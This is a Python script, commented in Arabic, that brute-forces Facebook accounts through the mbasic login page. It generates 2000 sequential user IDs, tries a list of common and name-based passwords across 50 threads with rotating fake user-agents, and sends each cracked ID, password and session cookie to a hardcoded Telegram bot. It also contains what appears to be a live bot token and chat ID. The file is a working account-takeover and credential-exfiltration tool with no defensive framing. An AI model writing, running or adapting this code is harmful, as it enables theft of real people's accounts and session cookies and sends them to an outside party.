import os, sys, time, random, requests, threading
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup

# 🔑 إعدادات تليجرام الخاصة بك
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

# 📋 قائمة كلمات المرور (50+ كلمة شائعة 2004-2005)
PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    'password', '123123', '112233', '445566', '778899', '000000', '111111', '12345',
    'facebook', 'love123', 'king123', 'admin123', 'user123', '20042004', '20052005',
    '654321', '321321', '1234567890', 'jasser04', 'jasser05', 'malo2004', 'malo2005'
] + [f'123456{i}' for i in range(10)] + [f'2004{i}' for i in range(10)] + [f'2005{i}' for i in range(10)]

def send_to_tg(status, uid, pas, cookie=""):
    msg = f"🔔 {status}\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookie}"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg})
    except: pass

def get_ua():
    """توليد User-Agent عشوائي متطور"""
    and_v = random.choice(['9', '10', '11', '12'])
    model = random.choice(['SM-G960F', 'SM-A515F', 'RMX2001', 'M2003J15SC'])
    return f"Mozilla/5.0 (Linux; Android {and_v}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 120)}.0.0.0 Mobile Safari/537.36"

def crack_engine(uid):
    """محرك الفحص: تجربة كل الكلمات على حساب واحد"""
    session = requests.Session()
    # استخدام واجهة mbasic لفيسبوك لضمان السرعة وتجاوز الحماية
    login_url = "https://mbasic.facebook.com/login.php"
    
    for pas in PASS_LIST:
        try:
            head = {
                'User-Agent': get_ua(),
                'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            # 1. جلب حقول الأمان
            r = session.get(login_url, headers=head, timeout=15)
            soup = BeautifulSoup(r.text, 'html.parser')
            form_data = {i.get("name"): i.get("value") for i in soup.find_all("input", {"type": "hidden"})}
            
            # 2. إضافة البيانات
            form_data.update({"email": uid, "pass": pas})
            
            # 3. محاولة الدخول
            res = session.post(login_url, data=form_data, headers=head, allow_redirects=False, timeout=15)
            
            if 'c_user' in session.cookies:
                cookie = ";".join([f"{k}={v}" for k, v in session.cookies.items()])
                print(f"\n✅ OK: {uid} | {pas}")
                send_to_tg("✅ حساب ناجح (OK)", uid, pas, cookie)
                break
            
            elif 'checkpoint' in res.headers.get('Location', ''):
                print(f"\n⚠️ CP: {uid} | {pas}")
                send_to_tg("⚠️ نقطة تفتيش (CP)", uid, pas)
                break
        except:
            continue

def run_main():
    start_id = 26701173
    total_to_check = 2000 # عدد الحسابات التي سيولدها ويفحصها
    
    print(f"🚀 بدء الفحص الجماعي المكثف من ID: {start_id}")
    ids = [str(start_id + i) for i in range(total_to_check)]
    
    # تشغيل 50 عملية متوازية لسرعة خيالية
    with ThreadPool(max_workers=50) as pool:
        pool.map(crack_engine, ids)

if __name__ == "__main__":
    run_main()
